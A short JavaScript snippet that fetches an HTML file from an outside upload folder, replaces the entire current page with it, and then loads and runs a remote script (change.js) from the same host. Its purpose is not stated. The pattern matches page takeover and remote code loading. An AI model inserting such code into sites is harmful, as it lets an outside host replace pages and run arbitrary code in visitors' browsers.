// Fetches the html file
fetch('https://www.icandrink.wtf/user/documents/upload/testujeme.html')
  .then(response => response.text())
  .then(htmlContent => {
    // Replace all html data with ones from file
    document.documentElement.innerHTML = htmlContent;

    // Load and run a script from a URL
    const script = document.createElement('script');
    script.src = 'https://www.icandrink.wtf/user/documents/upload/change.js';
    document.body.appendChild(script);
  })
  // In case anything goes wrong
  .catch(error => console.error('Error loading HTML file:', error));